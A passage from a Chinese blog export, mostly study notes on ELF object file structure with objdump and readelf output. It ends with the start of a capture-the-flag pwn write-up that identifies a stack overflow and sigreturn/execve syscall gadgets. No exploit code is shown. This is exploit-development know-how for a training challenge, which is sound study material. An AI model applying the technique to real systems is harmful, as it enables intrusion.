class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> global_init_var = <span class=\"number\">84</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> global_uninit_var;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func1</span><span class=\"params\">(<span class=\"keyword\">int</span> i)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">int</span> static_var = <span class=\"number\">85</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> <span class=\"keyword\">int</span> static_var2;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b;</span><br><span class=\"line\">\tfunc1(static_var + static_var2 + a + b);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译一下</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209161901015.png\" alt=\"image-20210209161901015\"></p>\n<p>现在我们来具体分析一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -h a.o</span><br><span class=\"line\">&#x2F;&#x2F;-h将基本信息打印出来</span><br><span class=\"line\">&#x2F;&#x2F;-x打印更多信息</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209162052499.png\" alt=\"image-20210209162052499\"></p>\n<blockquote>\n<p>代码段，数据段，bss段我们已经知道了</p>\n<p>可以看到还有<strong>只读数据段</strong><code>.rodata</code> <strong>注释段</strong><code>.comment</code> <strong>堆栈提示段</strong><code>.note.GNU-stack</code>段</p>\n<p>下面第二行CONTENTS ALLOC表示段的各种属性，CONTENTS表示该段在文件中存在</p>\n<p>看到BSS段是没有CONTENTS表示它实际在ELF文件中不存在内容</p>\n<p>下面我们就来看一下各个段的分布</p>\n</blockquote>\n<p>这里和书上不同的是<code>.note.GNU-stack</code>占了内容，那么我们也把他写上</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209163804417.png\" alt=\"image-20210209163804417\"></p>\n<h3 id=\"3-1-代码段\"><a href=\"#3-1-代码段\" class=\"headerlink\" title=\"3.1 代码段\"></a>3.1 代码段</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ objdump -s -d a.o</span><br><span class=\"line\">&#x2F;&#x2F;-s 将段内容按照16进制打印</span><br><span class=\"line\">&#x2F;&#x2F;-d 可以将所有包含指令的段反汇编</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a.o：     文件格式 elf32-i386</span><br><span class=\"line\"></span><br><span class=\"line\">Contents of section .text:</span><br><span class=\"line\"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class=\"line\"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class=\"line\"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class=\"line\"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class=\"line\"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class=\"line\"> 0050 fcffffff 83c410b8 00000000 8b4dfcc9  .............M..</span><br><span class=\"line\"> 0060 8d61fcc3                             .a..            </span><br><span class=\"line\">Contents of section .data:</span><br><span class=\"line\"> 0000 54000000 55000000                    T...U...        </span><br><span class=\"line\">Contents of section .rodata:</span><br><span class=\"line\"> 0000 25640a00                             %d..            </span><br><span class=\"line\">Contents of section .comment:</span><br><span class=\"line\"> 0000 00474343 3a202855 62756e74 7520352e  .GCC: (Ubuntu 5.</span><br><span class=\"line\"> 0010 342e302d 36756275 6e747531 7e31362e  4.0-6ubuntu1~16.</span><br><span class=\"line\"> 0020 30342e31 32292035 2e342e30 20323031  04.12) 5.4.0 201</span><br><span class=\"line\"> 0030 36303630 3900                        60609.          </span><br><span class=\"line\">Contents of section .eh_frame:</span><br><span class=\"line\"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class=\"line\"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class=\"line\"> 0020 00000000 1c000000 00410e08 8502420d  .........A....B.</span><br><span class=\"line\"> 0030 0558c50c 04040000 28000000 3c000000  .X......(...&lt;...</span><br><span class=\"line\"> 0040 1c000000 48000000 00440c01 00471005  ....H....D...G..</span><br><span class=\"line\"> 0050 02750043 0f03757c 06750c01 0041c543  .u.C..u|.u...A.C</span><br><span class=\"line\"> 0060 0c040400                             ....            </span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\">00000000 &lt;func1&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %ebp</span><br><span class=\"line\">   1:\t89 e5                \tmov    %esp,%ebp</span><br><span class=\"line\">   3:\t83 ec 08             \tsub    $0x8,%esp</span><br><span class=\"line\">   6:\t83 ec 08             \tsub    $0x8,%esp</span><br><span class=\"line\">   9:\tff 75 08             \tpushl  0x8(%ebp)</span><br><span class=\"line\">   c:\t68 00 00 00 00       \tpush   $0x0</span><br><span class=\"line\">  11:\te8 fc ff ff ff       \tcall   12 &lt;func1+0x12&gt;</span><br><span class=\"line\">  16:\t83 c4 10             \tadd    $0x10,%esp</span><br><span class=\"line\">  19:\t90                   \tnop</span><br><span class=\"line\">  1a:\tc9                   \tleave  </span><br><span class=\"line\">  1b:\tc3                   \tret    </span><br><span class=\"line\"></span><br><span class=\"line\">0000001c &lt;main&gt;:</span><br><span class=\"line\">  1c:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx</span><br><span class=\"line\">  20:\t83 e4 f0             \tand    $0xfffffff0,%esp</span><br><span class=\"line\">  23:\tff 71 fc             \tpushl  -0x4(%ecx)</span><br><span class=\"line\">  26:\t55                   \tpush   %ebp</span><br><span class=\"line\">  27:\t89 e5                \tmov    %esp,%ebp</span><br><span class=\"line\">  29:\t51                   \tpush   %ecx</span><br><span class=\"line\">  2a:\t83 ec 14             \tsub    $0x14,%esp</span><br><span class=\"line\">  2d:\tc7 45 f0 01 00 00 00 \tmovl   $0x1,-0x10(%ebp)</span><br><span class=\"line\">  34:\t8b 15 04 00 00 00    \tmov    0x4,%edx</span><br><span class=\"line\">  3a:\ta1 00 00 00 00       \tmov    0x0,%eax</span><br><span class=\"line\">  3f:\t01 c2                \tadd    %eax,%edx</span><br><span class=\"line\">  41:\t8b 45 f0             \tmov    -0x10(%ebp),%eax</span><br><span class=\"line\">  44:\t01 c2                \tadd    %eax,%edx</span><br><span class=\"line\">  46:\t8b 45 f4             \tmov    -0xc(%ebp),%eax</span><br><span class=\"line\">  49:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  4b:\t83 ec 0c             \tsub    $0xc,%esp</span><br><span class=\"line\">  4e:\t50                   \tpush   %eax</span><br><span class=\"line\">  4f:\te8 fc ff ff ff       \tcall   50 &lt;main+0x34&gt;</span><br><span class=\"line\">  54:\t83 c4 10             \tadd    $0x10,%esp</span><br><span class=\"line\">  57:\tb8 00 00 00 00       \tmov    $0x0,%eax</span><br><span class=\"line\">  5c:\t8b 4d fc             \tmov    -0x4(%ebp),%ecx</span><br><span class=\"line\">  5f:\tc9                   \tleave  </span><br><span class=\"line\">  60:\t8d 61 fc             \tlea    -0x4(%ecx),%esp</span><br><span class=\"line\">  63:\tc3                   \tret</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>通过上面这段代码</p>\n<p>我们对文件内容有了更深入的了解</p>\n<p>最左面是偏移量，中间是16进制内容，右面是ascii形式</p>\n<p>反汇编结果我们也很熟悉</p>\n</blockquote>\n<h3 id=\"3-2-数据段和只读数据段\"><a href=\"#3-2-数据段和只读数据段\" class=\"headerlink\" title=\"3.2 数据段和只读数据段\"></a>3.2 数据段和只读数据段</h3><p><code>.data</code>段保存<strong>已经初始化了的全局静态变量和局部静态变量</strong>,所以上面程序中<code>.data</code>是八个字节</p>\n<p><code>.rodata</code>存放只读数据，一般是程序里面的只读变量和字符串常量，例如上面中<code>printf</code>的参数<code>%d\\n\\0</code>是四个字节</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Contents of section .data:</span><br><span class=\"line\"> 0000 54000000 55000000                    T...U...        </span><br><span class=\"line\">Contents of section .rodata:</span><br><span class=\"line\"> 0000 25640a00                             %d..</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>也可以看出<code>.data</code>是84 85从低到高是0x54 0x00 0x00 0x00</p>\n<p><code>.rodata</code>是%d\\n\\0</p>\n</blockquote>\n<h3 id=\"3-3-BSS段\"><a href=\"#3-3-BSS段\" class=\"headerlink\" title=\"3.3 BSS段\"></a>3.3 BSS段</h3><p><code>.bss</code>段存储<strong>未初始化的全局变量和局部静态变量</strong>。</p>\n<h3 id=\"3-4-其他段\"><a href=\"#3-4-其他段\" class=\"headerlink\" title=\"3.4 其他段\"></a>3.4 其他段</h3><p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210140348425.png\" alt=\"image-20210210140348425\"></p>\n<p>这些段都是由.来做前缀，说明这些表的名字是系统保留的。我们可以自定义段名，并在文件中插入这个段，达到自己想干的事情。</p>\n<blockquote>\n<p>将一个二进制文件如图片，音乐作为目标文件的一个段</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o</span><br><span class=\"line\">objdump -ht image.o</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-ELF文件结构描述\"><a href=\"#4-ELF文件结构描述\" class=\"headerlink\" title=\"4.ELF文件结构描述\"></a>4.ELF文件结构描述</h2><p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141207866.png\" alt=\"image-20210210141207866\"></p>\n<p>ELF目标文件格式最前面是<strong>ELF文件头</strong>，包含整个文件的基本属性，如ELF文件版本、目标机器型号、程序入口地址等。</p>\n<p>在ELF文件中与段有关的重要结构就是段表(Section Hearder Table)，该表描述了ELF文件包含的所有段的信息，如每个段的段名、段的长度、在文件中的偏移和读写权限等。</p>\n<h3 id=\"4-1-文件头\"><a href=\"#4-1-文件头\" class=\"headerlink\" title=\"4.1 文件头\"></a>4.1 文件头</h3><p>查看ELF文件</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141759681.png\" alt=\"image-20210210141759681\"></p>\n<p>ELF头中包括了<strong>魔数，文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、重定位类型、硬件平台、平台版本、入口地址、程序头入口和长度、段表位置和长度及段的数量</strong></p>\n<p>为了更好定义各个成员大小、elf.h有一套自己变量体系</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142310041.png\" alt=\"image-20210210142310041\"></p>\n<p>下面来看一下“Elf32_Ehdr”这个结构体</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142459097.png\" alt=\"image-20210210142459097\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142507074.png\" alt=\"image-20210210142507074\"></p>\n<p>之后我们来对照一下</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142536099.png\" alt=\"image-20210210142536099\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142548337.png\" alt=\"image-20210210142548337\"></p>\n<p>这里具体来说一下魔数</p>\n<p><strong>魔数</strong>：</p>\n<p>ELF的魔数上面我们可以看到是16字节，也就是对应的16个数组</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142844872.png\" alt=\"image-20210210142844872\"></p>\n<p>最开始的4个字节是ELF文件必须相同的标识码</p>\n<p>为0x7F 0x45 0x4C 0x46 7F是ascii中的DEL控制符，45 4c 46分别是ascii中的ELF。几乎所有可执行文件格式开始都是魔数，如a.out的0x01 0x07，PE中的0x4d 0x5a。</p>\n<p>那么魔数是来干什么的？模式是用来确认文件的类型，操作系统在加载可执行文件的时候会确认魔数是否正确，如果不正确将会拒绝加载。</p>\n<p>下一个字节是0x01表示32位 0x02表示64位 </p>\n<p>第6个字节序 规定是大端还是小端</p>\n<p>第7个是主版本号，一般为1。后面的9个一般填0</p>\n<p><strong>文件类型</strong></p>\n<p>e_type成员表示文件类型，就是前面说的三种文件类型。</p>\n<p>操作系统通过这个来判断ELF文件类型，而不是通过后缀名。</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210143702078.png\" alt=\"image-20210210143702078\"></p>\n<h3 id=\"4-2-段表\"><a href=\"#4-2-段表\" class=\"headerlink\" title=\"4.2 段表\"></a>4.2 段表</h3><p><strong>段表（Section Header Table）</strong>是保存这些段的基本属性的结构。</p>\n<p>可以说，ELF文件的段结构就是由段表来决定的，编译器、链接器、和装载器都是依靠段表来定位和访问各个段的属性的。</p>\n<p>段表由ELF文件头的<code>e_shoff</code>成员决定。</p>\n<p>下面我们来看一下真正的段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ readelf -S a.o</span><br><span class=\"line\">&#x2F;&#x2F;各个段</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144604296.png\" alt=\"image-20210210144604296\"></p>\n<p>每个段都是以<code>Elf32_Shdr</code>结构体，因此<code>Elf32_Shdr</code>又叫做<strong>段描述符</strong></p>\n<p>所以上面就是有13个结构体，此外第一个是无用的，所以只有12个有效段。</p>\n<p>可以来看一下<code>Elf32_Shdr</code></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144945550.png\" alt=\"image-20210210144945550\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145159772.png\" alt=\"image-20210210145159772\"></p>\n<p><strong>段的类型</strong></p>\n<p>段的名字只在链接和编译中有意义，但不能真正表示段的类型。</p>\n<p>对于编译器和链接器来说，<strong>主要决定段的属性是段的类型（sh_type）和段的标志位(sh_flags)</strong></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145930584.png\" alt=\"image-20210210145930584\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145922440.png\" alt=\"image-20210210145922440\"></p>\n<p><strong>段的标志位</strong></p>\n<p>段的标志位表示该段在进程虚拟地址空间中的属性，如是否可写可执行等。</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150400718.png\" alt=\"image-20210210150400718\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150408040.png\" alt=\"image-20210210150408040\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150429555.png\" alt=\"image-20210210150429555\"></p>\n<p><strong>段的链接信息</strong></p>\n<p>如果段类型是与链接相关的，如重定位表、符号表等，那么sh_link和sh_info是有意义的</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150637999.png\" alt=\"image-20210210150637999\"></p>\n<h3 id=\"4-3-重定位表\"><a href=\"#4-3-重定位表\" class=\"headerlink\" title=\"4.3 重定位表\"></a>4.3 重定位表</h3><p>链接器在处理目标文件时，需要对目标文件中某些部位进行重定位，即代码段和数据段中那些对绝对地址引用的位置。这些重定位记录都会记录在重定位表里。</p>\n<p><code>.rel.text</code>就是一个重定位表。</p>\n<p><strong>每个重定位的段都会有一个相应的重定位的表</strong>。</p>\n<p>如<code>.text</code>中有<code>printf</code>的调用，所以就会有<code>.rel.text</code>而<code>.data</code>就没有重定位的。</p>\n<p>重定位表同时也是ELF的一个段，所以这个段的类型就是<code>SHT_REL</code>类型。<code>sh_link</code>就是符号表的下标，<code>sh_info</code>就是作用于哪个段。</p>\n<hr>\n<h3 id=\"4-4-字符串表\"><a href=\"#4-4-字符串表\" class=\"headerlink\" title=\"4.4 字符串表\"></a>4.4 字符串表</h3><p>字符串由于比较复杂，所以把字符串集中在一个表里就很简便，然后用偏移来表示字符串。</p>\n<h2 id=\"5-符号\"><a href=\"#5-符号\" class=\"headerlink\" title=\"5.符号\"></a>5.符号</h2><p>在链接中，目标文件中间相互拼合实际上是目标文件之间对地址的引用。即对函数和变量的地址的引用。</p>\n<p>如目标文件B用目标文件A中foo函数，那么就是目标文件A<strong>定义了foo</strong>，目标文件B<strong>引用了foo</strong>。</p>\n<p>在链接中，我们将函数和变量统称为<strong>符号</strong>，函数名和变量名为<strong>符号名</strong></p>\n<p><strong>在链接过程中很关键就是符号的管理，每一个目标文件都会有一个相应的符号表，这个表里面记录了目标文件用到的所有符号。每个定义的符号有一个对应的值叫符号值，符号值就是地址。</strong></p>\n<p>具体符号有下面几种类型</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210153736035.png\" alt=\"image-20210210153736035\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nm a.o</span><br><span class=\"line\">&#x2F;&#x2F;看符号</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210203929970.png\" alt=\"image-20210210203929970\"></p>\n<h3 id=\"5-1-ELF符号表结构\"><a href=\"#5-1-ELF符号表结构\" class=\"headerlink\" title=\"5.1 ELF符号表结构\"></a>5.1 ELF符号表结构</h3><p>ELF文件中符号表往往是一个段，一般叫做<code>.symtab</code>。符号表的结构是一个ELF32_Sym结构的数组，每个结构都是一个符号。</p>\n<p>Elf32_Sym的结构定义</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204148472.png\" alt=\"image-20210210204148472\"></p>\n<p>成员意义如下图</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204233887.png\" alt=\"image-20210210204233887\"></p>\n<p><strong>符号类型和绑定信息（st_info）</strong></p>\n<p>成员低4为是符号的类型，高28为表示符号绑定信息</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204418983.png\" alt=\"image-20210210204418983\"></p>\n<p><strong>符号所在段（st_shndx）</strong></p>\n<p>如果符号定义在本目标文件中，这个成员表示符号所在的段在段表的下标；但如果符号不是定义在本目标文件中，或者对于有些特殊符号，sh_shndx的值会有些特殊</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204647740.png\" alt=\"image-20210210204647740\"></p>\n<p><strong>符号值</strong></p>\n<p>上文说了，符号值就是每一个符号的变量地址</p>\n<p>具体来说，有以下几种类型</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204943554.png\" alt=\"image-20210210204943554\"></p>\n<p>看一下我们的符号表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -s a.o</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205129282.png\" alt=\"image-20210210205129282\"></p>\n<blockquote>\n<p>第一列Num就是数组下标，从零开始</p>\n<p>第二列vaule就是符号值，<code>st_value</code></p>\n<p>第三列Size为符号大小<code>st_size</code></p>\n<p>第四列和第五列为符号类型和绑定信息</p>\n<p>第七列就是Ndx即<code>st_shndx</code>表示符号所在的段。</p>\n<p>最后一列就是符号名称</p>\n</blockquote>\n<p>具体解释如下</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205708052.png\" alt=\"image-20210210205708052\"></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205716690.png\" alt=\"image-20210210205716690\"></p>\n<h3 id=\"5-2-特殊符号\"><a href=\"#5-2-特殊符号\" class=\"headerlink\" title=\"5.2 特殊符号\"></a>5.2 特殊符号</h3><p>特殊符号就是你无须定义它们，但你可以声明并使用他们。</p>\n<p>并且只有用ld链接器生产最终可执行文件这些符号才会存在，链接器会在将程序最终链接成可执行文件是将其解析成正确的值。</p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210211122171.png\" alt=\"image-20210210211122171\"></p>\n<p>后面的签名、强弱就跳过了，需要时继续研究。</p>\n<h1 id=\"0x03-静态链接\"><a href=\"#0x03-静态链接\" class=\"headerlink\" title=\"0x03 静态链接\"></a>0x03 静态链接</h1>","categories":[],"tags":["book"]},{"title":"一道栈题","url":"https://pz1o.top/2021/02/14/一道栈题/","content":"<h1 id=\"ciscn-2019-s-3\"><a href=\"#ciscn-2019-s-3\" class=\"headerlink\" title=\"ciscn_2019_s_3\"></a><strong>ciscn_2019_s_3</strong></h1><p>国赛的一道栈题</p>\n<p>main函数</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214151957313.png\" alt=\"image-20210214151957313\"></p>\n<p>vuln函数</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152021865.png\" alt=\"image-20210214152021865\"></p>\n<p>gadgets函数</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152042139.png\" alt=\"image-20210214152042139\"></p>\n<p>看一下gadgets函数</p>\n<p>里面有0f（15）和3b（59）看一下这两个是什么</p>\n<blockquote>\n<p>15 sys_rt_sigreturn<br>59 sys_execve</p>\n</blockquote>\n<p><strong>接下来说一下syscall</strong></p>\n<h2 id=\"syscall\"><a href=\"#syscall\" class=\"headerlink\" title=\"syscall\"></a>syscall</h2><p>什么时syscall</p>\n<p>看wiki</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153005144.png\" alt=\"image-20210214153005144\"></p>\n<p>在32位和64位中是有些不同的</p>\n<blockquote>\n<p>32位：</p>\n<p>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p>\n<p>调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</p>\n<p>调用方式: 使用 int 80h 中断进行系统调用</p>\n<p>64位：</p>\n<p>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p>\n<p>调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</p>\n<p>stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</p>\n<p>调用方式: 使用 syscall 进行系统调用</p>\n</blockquote>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p>接下来继续看题解</p>\n<p>从汇编中我们可以看到</p>\n<p>在vuln函数中有栈溢出</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153444144.png\" alt=\"image-20210214153444144\"></p>\n<p>同时这个题还有一个地方</p>\n<p>就是最后时没有leave的</p>\n<p>也就是offset是0x10，之后就是返回地址</p>\n<hr>\n<p>接下来看gadgets</p>\n<p>它里面有两个调用号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 